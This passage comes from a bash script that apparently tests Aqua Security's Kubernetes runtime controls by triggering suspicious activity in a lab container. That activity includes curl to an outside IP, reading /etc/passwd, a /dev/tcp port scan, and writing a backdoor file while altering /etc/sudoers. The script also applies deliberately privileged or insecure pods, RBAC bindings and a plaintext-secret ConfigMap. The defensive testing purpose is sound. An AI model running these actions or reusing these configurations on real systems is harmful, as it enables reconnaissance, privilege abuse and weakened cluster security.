                print_colored_message yellow "Executing 'curl http://68.183.212.246' command in the container..."
                echo
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- curl http://68.183.212.246
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_audit_review
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# File Block
test_file_block() {
    print_test_header "File Block"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with File Block Control enabled
        2. Add '/etc/passwd' to the list of blocked files
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing 'cat /etc/passwd' command in the container..."
                echo
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- cat /etc/passwd
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_audit_review
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Package Block
test_package_block() {
    print_test_header "Package Block"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with Package Block Control enabled
        2. Add 'tar' to the list of blocked packages
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing 'tar' command in the container..."
                echo
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- tar
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_audit_review
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Port Scanning Detection
test_port_scanning_detection() {
    print_test_header "Port Scanning Detection"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with Port Scanning Detection Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing port scan command in the container..."
                echo
                echo 'for p in {1..1024}; do timeout 1 bash -c "echo >/dev/tcp/10.0.0.1/$p" 2>/dev/null & done; wait'
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c 'for p in {1..1024}; do timeout 1 bash -c "echo >/dev/tcp/10.0.0.1/$p" 2>/dev/null & done; wait'
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_audit_review
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Non-compliant Images
test_block_non_compliant_images() {
    print_test_header "Block Non-compliant Images"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Update the Assurance Policy to check for Malware
        2. Ensure that the Assurance Policy blocks non-compliant images
        3. Ensure that the Assurance Policy is applied to this Kubernetes environment"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            print_colored_message yellow "Deploying non-compliant image test container with image: jerbi/eicar:latest"
            echo
            ensure_test_namespace
            kubectl delete deployment aqua-non-compliant-image-test -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: aqua-non-compliant-image-test
spec:
  replicas: 1
  selector:
    matchLabels:
      app: aqua-non-compliant-image-test
  template:
    metadata:
      labels:
        app: aqua-non-compliant-image-test
    spec:
      containers:
      - name: eicar
        image: jerbi/eicar:latest
        imagePullPolicy: Always
        command:
        - sleep
        args:
        - infinity
EOF
            echo
            print_colored_message yellow "[!] Observe that the deployment or pod creation is blocked because the image is non-compliant."
            echo
            print_colored_message green "[✓] Please login to the Aqua Console's Assurance and Risk Explorer screens to view the non-compliant image details."
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Unregistered Images
test_block_unregistered_images() {
    print_test_header "Block Unregistered Images"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Update the Assurance Policy to block unregistered images
        2. Ensure that the Assurance Policy is applied to this Kubernetes environment
        3. Ensure that 'Automatically registering running containers' is disabled in Global Settings
        4. If using Kube-Enforcer, ensure that 'Registering discovered pod images' is disabled"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            unregistered_image=$(prompt_for_test_image "Enter image to deploy for the unregistered image test")

            echo
            print_colored_message yellow "Deploying unregistered image test container with image: $unregistered_image"
            echo
            ensure_test_namespace
            kubectl delete deployment aqua-unregistered-image-test -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: aqua-unregistered-image-test
spec:
  replicas: 1
  selector:
    matchLabels:
      app: aqua-unregistered-image-test
  template:
    metadata:
      labels:
        app: aqua-unregistered-image-test
    spec:
      containers:
      - name: unregistered-image
        image: $unregistered_image
        imagePullPolicy: Always
        command:
        - sleep
        args:
        - infinity
EOF
            echo
            print_colored_message yellow "[!] Observe that the deployment or pod creation is blocked because the image is unregistered."
            echo
            print_colored_message green "[✓] Please login to the Aqua Console's Assurance and Risk Explorer screens to view the unregistered image details."
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# File Integrity Monitoring
test_file_integrity_monitoring() {
    print_test_header "File Integrity Monitoring"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with File Integrity Monitoring Control enabled
        2. Add '/etc/sudoers' and '/etc/backdoor.conf' to the monitored files
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing File Integrity Monitoring create, modify, permission change, and delete actions in the container..."
                echo
                cat <<'EOF'
# Create a file
echo "malicious change" > /etc/backdoor.conf

# Modify an existing file
echo "debug=true" >> /etc/sudoers

# Change file permissions
chmod 777 /etc/sudoers

# Delete a file
rm /etc/sudoers
EOF
                print_colored_message yellow "Preparing baseline '/etc/sudoers' file..."
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c 'touch /etc/sudoers'

                print_colored_message yellow "Creating '/etc/backdoor.conf'..."
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c 'echo "malicious change" > /etc/backdoor.conf'

                print_colored_message yellow "Modifying '/etc/sudoers'..."
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c 'echo "debug=true" >> /etc/sudoers'

                print_colored_message yellow "Changing permissions on '/etc/sudoers'..."
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- chmod 777 /etc/sudoers

                print_colored_message yellow "Deleting '/etc/sudoers'..."
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- rm /etc/sudoers
                echo
                print_colored_message yellow "[!] Observe that file create, modify, permission change, or delete activity was detected by Aqua."
                echo
                print_audit_review
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# System Integrity Monitoring
test_system_integrity_monitoring() {
    print_test_header "System Integrity Monitoring"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with System Integrity Monitoring Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Ensure that Block Container Exec Control is disabled"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing 'date +%T -s \"10:00:00\"' command in the container..."
                echo
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- date +%T -s "10:00:00"
                echo
                print_colored_message yellow "[!] Observe that system time change activity was detected by Aqua."
                echo
                print_audit_review
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Limit Container Privileges
test_limit_container_privileges() {
    print_test_header "Limit Container Privileges"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Container Runtime Policy with Limit Container Privileges enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. Linux Only options:
           - Access to host network
           - Adding capabilities with --cap-add
           - Configured with 'root' user
           - Privileged containers
           - Use the host IPC namespace
           - Use the host PID namespace
           - Use the host user namespace
           - Use the host UTS namespace
        4. Windows Only: Port binding lower than 1024 (requires a Windows image and host).
        5. This workflow deploys seven Linux Kubernetes test pods. Host UTS requires a separate runtime test.
        6. Scope the policy to aqua-probe-lab. Select one restriction at a time to isolate results; a root image or host namespace may match multiple restrictions."
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            privilege_test_image=$(prompt_for_test_image "Enter image to deploy for the Limit Container Privileges tests")
            print_colored_message yellow "Cleaning up previous Limit Container Privileges test pods..."
            ensure_test_namespace
            kubectl delete pod host-network-test cap-add-test root-user-test privileged-test host-ipc-test host-pid-test host-userns-test host-uts-test -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found

            echo
            print_colored_message yellow "1. Access to host network - blocked by hostNetwork: true"
            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-network-test
spec:
  nodeSelector:
    kubernetes.io/os: linux
  hostNetwork: true
  containers:
  - name: test
    image: $privilege_test_image
    imagePullPolicy: Always
    command: ["sleep","3600"]
EOF
            echo "Verify: kubectl get pod host-network-test -n $AQUA_PROBE_TEST_NAMESPACE -o yaml | grep hostNetwork"

            echo
            print_colored_message yellow "2. Adding capabilities with --cap-add - blocked by extra Linux capabilities"
            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: cap-add-test
spec:
  nodeSelector:
    kubernetes.io/os: linux
  containers:
  - name: test
    image: $privilege_test_image
    imagePullPolicy: Always
    securityContext:
      capabilities:
        add:
        - NET_ADMIN
    command: ["sleep","3600"]
EOF
            echo "Common capabilities: SYS_ADMIN, NET_ADMIN, SYS_PTRACE, DAC_OVERRIDE"
            echo "Verify: cat /proc/1/status | grep Cap"

            echo
            print_colored_message yellow "3. Configured with root user - blocked by running as UID 0"
            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: root-user-test
spec:
  nodeSelector:
    kubernetes.io/os: linux
  containers:
  - name: test
    image: $privilege_test_image
    imagePullPolicy: Always
    securityContext:
      runAsUser: 0
    command: ["sleep","3600"]
EOF
            echo "Verify: id"
            echo "Expected output: uid=0(root) gid=0(root)"

            echo
            print_colored_message yellow "4. Privileged containers - blocked by privileged mode"
            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: privileged-test
spec:
  nodeSelector:
    kubernetes.io/os: linux
  containers:
  - name: test
    image: $privilege_test_image
    imagePullPolicy: Always
    securityContext:
      privileged: true
    command: ["sleep","3600"]
EOF
            echo "Verify: cat /proc/self/status | grep CapEff"

            echo
            print_colored_message yellow "5. Use the host IPC namespace - blocked by hostIPC: true"
            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-ipc-test
spec:
  nodeSelector:
    kubernetes.io/os: linux
  hostIPC: true
  containers:
  - name: test
    image: $privilege_test_image
    imagePullPolicy: Always
    command: ["sleep","3600"]
EOF
            echo "Verify: ipcs"

            echo
            print_colored_message yellow "6. Use the host PID namespace - blocked by hostPID: true"
            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-pid-test
spec:
  nodeSelector:
    kubernetes.io/os: linux
  hostPID: true
  containers:
  - name: test
    image: $privilege_test_image
    imagePullPolicy: Always
    command: ["sleep","3600"]
EOF
            echo "Verify: ps aux"

            echo
            print_colored_message yellow "7. Use the host user namespace - blocked by hostUsers: true"
            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-userns-test
spec:
  nodeSelector:
    kubernetes.io/os: linux
  hostUsers: true
  containers:
  - name: test
    image: $privilege_test_image
    imagePullPolicy: Always
    command: ["sleep","3600"]
EOF
            echo "Verify: cat /proc/self/uid_map"

            echo
            print_colored_message yellow "8. Use the host UTS namespace - separate runtime test required"
            echo "Kubernetes has no hostUTS pod field; hostNetwork does not request the host UTS namespace."
            echo "Use --uts=host on an Aqua-monitored Linux Docker host with a policy scoped to that Docker container."
            echo "This script does not run the Docker UTS test automatically."
            echo
            print_colored_message yellow "Windows Only: Port binding lower than 1024"
            echo "Requires a monitored Windows container host and a compatible Windows image actually binding a port such as 80."
            echo "Declaring containerPort alone does not bind a port. This Linux workflow skips the Windows test."

            echo
            print_colored_message yellow "[!] Check pod status and Aqua audit evidence for the selected restriction. Kubernetes admission, scheduling, and image errors alone do not prove Aqua enforcement."
            echo
            print_audit_review
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Non-Kubernetes Containers
test_block_non_kubernetes_containers() {
    print_test_header "Block Non-Kubernetes Containers"
    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with Block Non-Kubernetes Containers Control enabled
        2. Ensure that the Custom Policy is set to 'Enforce' mode
        3. SSH to the Kubernetes worker node where the Aqua Enforcer is running
        4. Ensure that you have access to the container runtime to deploy a Docker-only container"
        echo
        print_colored_message yellow "[!] Disclaimer: This test only works when executed on a Kubernetes worker node with direct access to the container runtime. It is intended to deploy a Docker-only container outside the Kubernetes API."
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            non_k8s_image=$(prompt_for_test_image "Enter image to deploy for the non-Kubernetes container test")
            print_colored_message yellow "Deploying Docker-only container with image: $non_k8s_image"
            echo
            echo "docker run -d --name aqua-non-k8s-container $non_k8s_image sleep 3600"
            docker rm -f aqua-non-k8s-container >/dev/null 2>&1
            docker run -d --name aqua-non-k8s-container $non_k8s_image sleep 3600
            echo
            print_colored_message yellow "[!] Observe that the Docker-only container is blocked because it was started outside Kubernetes."
            echo
            print_audit_review
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Port Block
test_port_block() {
    print_test_header "Port Block"
    local default_host="10.0.0.1"
    local default_port="22"

    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with Port Block Control enabled
        2. Add the destination port you will test to the blocked ports list
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that Block Container Exec Control is disabled"
        echo
        print_colored_message yellow "[!] This test opens a TCP connection from the Aqua test container to a target host and port. Use a reachable target and make sure the same port is configured in the Port Block control."
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                read -p "$(format_prompt "Enter target host or IP [default: $default_host]: ")" port_block_host
                if [ -z "$port_block_host" ]; then
                    port_block_host="$default_host"
                fi
                read -p "$(format_prompt "Enter target port configured in the Port Block policy [default: $default_port]: ")" port_block_port
                if [ -z "$port_block_port" ]; then
                    port_block_port="$default_port"
                fi

                echo
                print_colored_message yellow "Executing TCP connection test to $port_block_host:$port_block_port in the container..."
                echo
                echo "timeout 5 bash -c 'echo >/dev/tcp/$port_block_host/$port_block_port'"
                kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c "timeout 5 bash -c 'echo >/dev/tcp/$port_block_host/$port_block_port'"
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because the destination port has been blocked by Aqua."
                echo
                print_audit_review
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Volumes Blocked
test_volumes_blocked() {
    print_test_header "Volumes Blocked"
    local default_host_path="/etc"
    local default_mount_path="/host-etc"

    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with Volumes Blocked Control enabled
        2. Add the host path you will test to the blocked volumes list
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that the policy is applied to this Kubernetes environment"
        echo
        print_colored_message yellow "[!] This test deploys a pod with a hostPath volume. Use a host path that is configured in the Volumes Blocked control."
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            read -p "$(format_prompt "Enter blocked host path to mount [default: $default_host_path]: ")" blocked_host_path
            if [ -z "$blocked_host_path" ]; then
                blocked_host_path="$default_host_path"
            fi
            read -p "$(format_prompt "Enter container mount path [default: $default_mount_path]: ")" blocked_mount_path
            if [ -z "$blocked_mount_path" ]; then
                blocked_mount_path="$default_mount_path"
            fi

            echo
            volume_test_image=$(prompt_for_test_image "Enter image to deploy for the Volumes Blocked test")
            print_colored_message yellow "Deploying volume block test pod with image '$volume_test_image' and hostPath '$blocked_host_path' mounted at '$blocked_mount_path'..."
            echo
            ensure_test_namespace
            kubectl delete pod volume-block-test -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: volume-block-test
spec:
  containers:
  - name: test
    image: $volume_test_image
    imagePullPolicy: Always
    command: ["sleep","3600"]
    volumeMounts:
    - name: blocked-volume
      mountPath: $blocked_mount_path
      readOnly: true
  volumes:
  - name: blocked-volume
    hostPath:
      path: $blocked_host_path
      type: Directory
EOF
            echo
            echo "Verify: kubectl get pod volume-block-test -n $AQUA_PROBE_TEST_NAMESPACE -o yaml | grep -A5 hostPath"
            echo
            print_colored_message yellow "[!] Observe that the pod creation is blocked because it requests a blocked hostPath volume."
            echo
            print_audit_review
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Block Non-compliant Resources
test_block_non_compliant_resources() {
    print_test_header "Block Non-compliant Resources"
    local lab_namespace="$AQUA_PROBE_TEST_NAMESPACE"

    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create a Custom Policy with Block Non-compliant Resources enabled
        2. Enable the Kubernetes resource checks you want to validate
        3. Ensure that the Custom Policy is set to 'Enforce' mode
        4. Ensure that the policy is applied to this Kubernetes environment"
        echo
        print_colored_message yellow "[!] This test applies intentionally non-compliant Kubernetes resources in namespace '$lab_namespace'. Use only in a disposable lab cluster."
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            non_compliant_resource_image=$(prompt_for_test_image "Enter image to deploy for the non-compliant resource tests")
            print_colored_message yellow "Applying non-compliant Kubernetes resource examples with image: $non_compliant_resource_image"
            echo
            kubectl create namespace $lab_namespace --dry-run=client -o yaml | kubectl apply -f -
            apply_non_compliant_resource "host-ipc-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-ipc-bad
  namespace: $lab_namespace
spec:
  hostIPC: true
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
EOF
            apply_non_compliant_resource "host-pid-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-pid-bad
  namespace: $lab_namespace
spec:
  hostPID: true
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
EOF
            apply_non_compliant_resource "host-network-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-network-bad
  namespace: $lab_namespace
spec:
  hostNetwork: true
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
EOF
            apply_non_compliant_resource "host-port-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: host-port-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    ports:
    - containerPort: 80
      hostPort: 8080
EOF
            apply_non_compliant_resource "non-compliant-image-domain-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: non-compliant-image-domain-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
EOF
            apply_non_compliant_resource "anonymous-view-bad" <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: anonymous-view-bad
subjects:
- kind: User
  name: system:anonymous
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: view
  apiGroup: rbac.authorization.k8s.io
EOF
            apply_non_compliant_resource "cpu-limit-missing-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: cpu-limit-missing-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    resources:
      requests:
        cpu: "100m"
EOF
            apply_non_compliant_resource "cpu-request-missing-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: cpu-request-missing-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    resources:
      limits:
        cpu: "500m"
EOF
            apply_non_compliant_resource "allow-privilege-escalation-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: allow-privilege-escalation-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    securityContext:
      allowPrivilegeEscalation: true
EOF
            apply_non_compliant_resource "configmap-secret-bad" <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: configmap-secret-bad
  namespace: $lab_namespace
data:
  password: "SuperSecret123"
  api_key: "abc123"
EOF
            apply_non_compliant_resource "configmap-sensitive-bad" <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: configmap-sensitive-bad
  namespace: $lab_namespace
data:
  username: "admin"
  email: "admin@example.com"
EOF
            apply_non_compliant_resource "caps-not-drop-all-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: caps-not-drop-all-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    securityContext:
      capabilities:
        drop:
        - NET_RAW
EOF
            apply_non_compliant_resource "caps-drop-none-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: caps-drop-none-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
EOF
            apply_non_compliant_resource "delete-pod-logs-bad" <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: delete-pod-logs-bad
  namespace: $lab_namespace
rules:
- apiGroups: [""]
  resources: ["pods/log"]
  verbs: ["delete"]
EOF
            apply_non_compliant_resource "pod-exec-bad" <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-exec-bad
  namespace: $lab_namespace
rules:
- apiGroups: [""]
  resources: ["pods/exec"]
  verbs: ["create"]
EOF
            apply_non_compliant_resource "latest-tag-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: latest-tag-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
EOF
            apply_non_compliant_resource "disallowed-hostpath-bad" <<EOF
